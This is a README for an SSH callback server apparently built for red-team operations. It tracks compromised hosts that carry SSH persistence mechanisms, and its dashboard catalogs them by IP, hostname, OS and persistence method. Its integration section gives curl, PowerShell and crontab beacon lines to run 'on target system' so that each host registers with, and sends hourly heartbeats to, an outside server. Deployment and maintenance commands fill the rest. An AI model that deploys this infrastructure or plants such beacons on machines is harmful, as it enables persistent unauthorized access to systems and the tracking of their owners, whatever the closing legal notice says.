# POLYGOTYA - SSH Callback Server

VPS2.0 integration of POLYGOTTEM SECURE SSH Callback Server with TEMPEST Level C compliance and Post-Quantum Cryptography.

---

## Overview

**Deployment:** `polygotya.swordintelligence.airforce`

**Purpose:** Lightweight callback server to register and verify SSH persistence installations for authorized security testing and research.

**Security Features:**
- **Post-Quantum Cryptography** (ML-KEM-1024, ML-DSA-87)
- **TEMPEST Level C** compliant UI (Amber/Green on Black)
- **User/Password Authentication** with bcrypt + SHA-512
- **Session Management** with configurable timeout
- **Audit Logging** with SHA-384 integrity verification
- **Account Lockout** after 5 failed attempts (30-minute lock)
- **TLS 1.3 Only** with strong ciphers (AES-256-GCM, ChaCha20)
- **Rate Limiting** (5 req/s API, 10 req/s dashboard)

---

## Quick Start

### 1. Deploy POLYGOTYA

```bash
cd /home/user/VPS2.0

# Configure environment
cp .env.template .env
nano .env  # Set DEPLOY_POLYGOTYA=true and generate secure keys

# Generate secure keys
openssl rand -base64 32  # Use for POLYGOTYA_API_KEY
openssl rand -hex 32     # Use for POLYGOTYA_SECRET_KEY

# Deploy stack
docker-compose -f docker-compose.yml -f docker-compose.polygotya.yml up -d

# Check health
docker ps | grep polygotya
docker logs polygotya
```

### 2. First Login

1. **Access:** `https://polygotya.swordintelligence.airforce/`
2. **View startup logs for default admin password:**
   ```bash
   docker logs polygotya | grep "DEFAULT ADMIN"
   ```
3. **Login with:**
   - **Username**: `admin`
   - **Password**: (from startup logs or `.env`)
4. **CHANGE PASSWORD IMMEDIATELY**

### 3. Access Dashboard

The dashboard provides:
- **Real-Time Statistics**: Total callbacks, unique IPs, verified connections
- **Callback Table**: Timestamp, IP address, hostname, OS info, SSH port, verification status
- **API Documentation**: Complete endpoint reference with examples
- **PQC Status**: Post-quantum cryptography availability

---

## Architecture

### Components

| Service | Container | Port | Network | Purpose |
|---------|-----------|------|---------|---------|
| POLYGOTYA | `polygotya` | 5000 | frontend | SSH callback server |
| Caddy | `caddy` | 443 | frontend | TLS 1.3 termination |

### Network Topology

**Frontend Network** (`br-frontend`):
- Caddy ↔ POLYGOTYA only
- Public-facing via `polygotya.swordintelligence.airforce`
- TLS 1.3 termination with strong ciphers

**Data Persistence**:
- SQLite database: `ssh-callback-server/data/ssh_callbacks_secure.db`
- Audit logs stored in database with SHA-384 integrity hashes
- Automatic database creation on first startup

---

## Security Configuration

### Authentication

**Default Admin Account:**
- **Username**: `admin`
- **Password**: Auto-generated (printed in logs) or set via `POLYGOTYA_ADMIN_PASSWORD`
- **Role**: Full administrative access

**Security Settings:**
- **Password Hashing**: bcrypt (12 rounds) + SHA-512 pre-hash
- **Session Timeout**: 1 hour (configurable via `POLYGOTYA_SESSION_TIMEOUT`)
- **Account Lockout**: 5 failed attempts → 30-minute lock
- **Cookies**: HttpOnly, Secure, SameSite=Strict

### Post-Quantum Cryptography

**ML-KEM-1024** (Key Encapsulation):
- NIST FIPS 203 standard
- 256-bit classical security equivalent
- Quantum-resistant key exchange

**ML-DSA-87** (Digital Signatures):
- NIST FIPS 204 standard
- 256-bit classical security equivalent
- Quantum-resistant signature verification

### TEMPEST Level C Compliance

**Display Standards:**
- **Color Scheme**: Amber (#FFB000) and Green (#00FF00) on Black (#000000)
- **Contrast Ratios**: 8.5:1 (Amber), 12:1 (Green) - Exceeds WCAG AAA
- **Benefits**: Reduced EMI emissions, lower power consumption, eye strain reduction

**Compliance Checklist:**
- ✅ Amber/Green on Black color scheme
- ✅ High contrast ratios (>8:1 for primary text)
- ✅ No bright white displays
- ✅ Reduced pixel transitions
- ✅ Monospace fonts (consistent character width)
- ✅ Minimal animations (reduces EMI)
- ✅ No external resource loading

---

## API Endpoints

### 1. Register SSH Callback

**POST** `/api/register`

**Authentication**: API Key

```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "api_key": "YOUR_API_KEY",
    "hostname": "target-server",
    "username": "root",
    "ssh_port": 22,
    "os_type": "linux",
    "os_version": "Ubuntu 22.04",
    "architecture": "x86_64",
    "environment": "cloud_aws",
    "init_system": "systemd",
    "ssh_implementation": "openssh",
    "persistence_methods": ["systemd_service", "cron_job"]
  }' \
  https://polygotya.swordintelligence.airforce/api/register
```

**Response:**
```json
{
  "status": "success",
  "message": "SSH callback registered",
  "callback_id": 1,
  "timestamp": "2025-11-18T12:34:56.789Z",
  "integrity_hash": "sha384_hash_here",
  "pqc_enabled": true
}
```

### 2. Send Heartbeat

**POST** `/api/heartbeat`

**Authentication**: API Key

```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "api_key": "YOUR_API_KEY",
    "hostname": "target-server"
  }' \
  https://polygotya.swordintelligence.airforce/api/heartbeat
```

### 3. Get All Callbacks

**GET** `/api/callbacks`

**Authentication**: Web Session (login required)

Access via browser after login.

### 4. Get Statistics

**GET** `/api/stats`

**Authentication**: Web Session (login required)

Returns enhanced stats including PQC information.

### 5. Health Check

**GET** `/health`

**Authentication**: None (public)

```bash
curl https://polygotya.swordintelligence.airforce/health
```

**Response:**
```json
{
  "status": "healthy",
  "timestamp": "2025-11-18T12:34:56.789Z",
  "version": "2.0.0-PQC",
  "pqc_enabled": true,
  "security": {
    "hash_algorithm": "SHA-512/384",
    "kem": "ML-KEM-1024",
    "signature": "ML-DSA-87",
    "tempest_level": "C"
  }
}
```

---

## Integration with SSH Persistence Modules

### Method 1: Using Client Script

```bash
# On target system (after SSH persistence installation)
python3 ssh-callback-server/client_callback.py \
  --server https://polygotya.swordintelligence.airforce \
  --api-key YOUR_API_KEY \
  --auto-detect
```

### Method 2: Direct Integration

Add to your SSH persistence scripts:

**Linux:**
```bash
# After successful SSH installation
curl -X POST \
  -H "Content-Type: application/json" \
  -d "{
    \"api_key\":\"YOUR_API_KEY\",
    \"hostname\":\"$(hostname)\",
    \"os_type\":\"linux\",
    \"ssh_port\":22
  }" \
  https://polygotya.swordintelligence.airforce/api/register
```

**Windows (PowerShell):**
```powershell
# After successful SSH installation
$body = @{
    api_key = "YOUR_API_KEY"
    hostname = $env:COMPUTERNAME
    os_type = "windows"
    ssh_port = 22
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://polygotya.swordintelligence.airforce/api/register" `
  -Method POST `
  -ContentType "application/json" `
  -Body $body
```

### Method 3: Cron Heartbeat (Linux)

```bash
# Add to crontab for hourly heartbeats
0 * * * * curl -X POST -H "Content-Type: application/json" -d '{"api_key":"YOUR_KEY","hostname":"'$(hostname)'"}' https://polygotya.swordintelligence.airforce/api/heartbeat >/dev/null 2>&1
```

---

## Monitoring & Maintenance

### View Container Logs

```bash
# Follow logs
docker logs -f polygotya

# Last 100 lines
docker logs --tail=100 polygotya

# Check PQC status
docker logs polygotya | grep "Post-Quantum"
```

### Database Operations

**Backup Database:**
```bash
# Backup
docker exec polygotya sqlite3 /data/ssh_callbacks_secure.db ".backup /data/backup-$(date +%Y%m%d).db"

# Copy backup to host
docker cp polygotya:/data/backup-$(date +%Y%m%d).db ./backups/

# Restore from backup
docker exec polygotya sqlite3 /data/ssh_callbacks_secure.db ".restore /data/backup-YYYYMMDD.db"
```

**Export to JSON:**
```bash
docker exec polygotya sqlite3 /data/ssh_callbacks_secure.db \
  "SELECT json_group_array(json_object(
    'timestamp', timestamp,
    'ip_address', ip_address,
    'hostname', hostname,
    'os_type', os_type
  )) FROM ssh_callbacks" > callbacks.json
```

### Security Metrics

```bash
# Failed login attempts
docker exec polygotya sqlite3 /data/ssh_callbacks_secure.db \
  "SELECT COUNT(*) FROM audit_log WHERE action='LOGIN_FAILED'"

# Active sessions
docker exec polygotya sqlite3 /data/ssh_callbacks_secure.db \
  "SELECT COUNT(*) FROM sessions WHERE datetime(expires_at) > datetime('now')"

# PQC-signed callbacks
docker exec polygotya sqlite3 /data/ssh_callbacks_secure.db \
  "SELECT COUNT(*) FROM ssh_callbacks WHERE pqc_signature IS NOT NULL"

# Locked accounts
docker exec polygotya sqlite3 /data/ssh_callbacks_secure.db \
  "SELECT username, locked_until FROM users WHERE locked_until IS NOT NULL"
```

---

## Troubleshooting

### Container Won't Start

```bash
# Check logs
docker logs polygotya

# Rebuild container
docker-compose -f docker-compose.polygotya.yml build --no-cache
docker-compose -f docker-compose.yml -f docker-compose.polygotya.yml up -d
```

### Login Not Working

```bash
# Check admin password in logs
docker logs polygotya | grep "DEFAULT ADMIN"

# Unlock account if locked
docker exec polygotya sqlite3 /data/ssh_callbacks_secure.db \
  "UPDATE users SET locked_until = NULL, failed_attempts = 0 WHERE username = 'admin';"
```

### PQC Not Available

```bash
# Check if liboqs is installed
docker exec polygotya python3 -c "import oqs; print('PQC OK')"

# If error, rebuild with PQC support
docker-compose -f docker-compose.polygotya.yml build --no-cache
```

### Health Check Failing

```bash
# Test health endpoint
curl https://polygotya.swordintelligence.airforce/health

# Check container health
docker ps | grep polygotya

# View health check logs
docker inspect --format='{{json .State.Health}}' polygotya | jq
```

---

## Security Best Practices

### 1. Key Management

```bash
# Generate strong API key
openssl rand -base64 32

# Generate strong session secret
openssl rand -hex 32

# Store securely in .env file
nano .env
```

### 2. Password Policy

- **Minimum Length**: 12 characters (enforced in UI)
- **Complexity**: Uppercase, lowercase, numbers, symbols
- **Hashing**: bcrypt (12 rounds) + SHA-512 pre-hash
- **Never stored in plaintext**

### 3. Regular Backups

```bash
# Daily backup cron
0 2 * * * docker exec polygotya sqlite3 /data/ssh_callbacks_secure.db ".backup /data/backup-$(date +\%Y\%m\%d).db"
```

### 4. Audit Log Review

```bash
# Review recent audit events
docker exec polygotya sqlite3 /data/ssh_callbacks_secure.db \
  "SELECT * FROM audit_log ORDER BY timestamp DESC LIMIT 50"
```

---

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `POLYGOTYA_API_KEY` | - | Authentication key for API callbacks |
| `POLYGOTYA_SECRET_KEY` | - | Flask session secret |
| `POLYGOTYA_ADMIN_PASSWORD` | auto-generated | Default admin password |
| `POLYGOTYA_SESSION_TIMEOUT` | 3600 | Session timeout in seconds (1 hour) |

---

## Summary

**What you get:**
- ✅ Secure SSH callback server at `polygotya.swordintelligence.airforce`
- ✅ TLS 1.3 with strong ciphers (AES-256-GCM, ChaCha20)
- ✅ Post-Quantum Cryptography (ML-KEM-1024, ML-DSA-87)
- ✅ TEMPEST Level C compliant UI (Amber/Green on Black)
- ✅ Network isolation (internal Docker network)
- ✅ Real-time dashboard with statistics
- ✅ Persistent SQLite database
- ✅ Audit logging with integrity verification
- ✅ Account lockout protection
- ✅ Rate limiting (5 req/s API, 10 req/s dashboard)
- ✅ Automated backup capability

**Next Steps:**
1. Complete initial deployment
2. Change default admin password
3. Generate and secure API key
4. Configure heartbeat automation
5. Set up backup automation with cron
6. Monitor logs and security metrics

**Documentation:**
- Main README: `ssh-callback-server/README.md`
- Secure README: `ssh-callback-server/README_SECURE.md`
- Client Script: `ssh-callback-server/client_callback.py`

**Legal Notice:**
- This tool is designed for **authorized security testing and research only**
- Only use on systems you own or have explicit permission to test
- Obtain proper authorization before deployment
- Follow all applicable laws and regulations
- Use responsibly and ethically
